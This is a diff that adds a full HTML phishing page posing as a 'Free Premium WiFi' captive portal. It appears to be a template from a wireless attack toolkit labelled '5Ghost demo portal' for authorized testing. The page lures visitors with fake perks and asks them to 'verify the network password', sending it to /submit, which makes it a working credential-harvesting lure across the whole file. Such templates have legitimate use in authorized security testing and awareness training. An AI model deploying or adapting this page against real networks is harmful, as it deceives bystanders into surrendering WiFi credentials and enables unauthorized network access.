@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Free WiFi</title>
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;min-height:100vh;
+ display:flex;align-items:center;justify-content:center;padding:20px;
+ background:linear-gradient(135deg,#ff6a3d,#ffb238)}
+.card{background:#fff;width:100%;max-width:360px;border-radius:20px;padding:28px 24px;
+ text-align:center;box-shadow:0 16px 50px rgba(0,0,0,.3)}
+.tag{display:inline-block;background:#ffe8d6;color:#e0521b;font-size:12px;font-weight:700;
+ padding:5px 12px;border-radius:20px;margin-bottom:12px}
+h1{font-size:23px;font-weight:800;color:#1a1a1a;line-height:1.15;margin-bottom:14px}
+ul{list-style:none;text-align:left;font-size:13px;color:#555;margin:0 auto 20px;max-width:230px}
+li{padding:5px 0}
+label{display:block;text-align:left;font-size:12px;color:#888;margin-bottom:6px}
+input{width:100%;padding:13px;font-size:15px;border:2px solid #eee;border-radius:12px;outline:none}
+input:focus{border-color:#ff6a3d}
+button{width:100%;margin-top:14px;padding:15px;font-size:16px;font-weight:800;color:#fff;
+ background:#ff5722;border:none;border-radius:12px;cursor:pointer}
+.note{font-size:10px;color:#bbb;margin-top:14px}
+</style>
+</head>
+<body>
+<div class="card">
+<span class="tag">&#127881; LIMITED OFFER</span>
+<h1>FREE Premium WiFi!</h1>
+<ul>
+<li>&#9889; Unlimited high-speed access</li>
+<li>&#127758; Connect all your devices</li>
+<li>&#128274; Secure encrypted browsing</li>
+</ul>
+<form action="/submit" method="get">
+<label for="password">Verify the network password to unlock</label>
+<input type="password" id="password" name="password" minlength="8" placeholder="Network password" required autofocus>
+<button type="submit">Unlock Free WiFi &rarr;</button>
+</form>
+<p class="note">5Ghost demo portal &middot; authorized testing &amp; education only</p>
+</div>
+</body>
+</html>
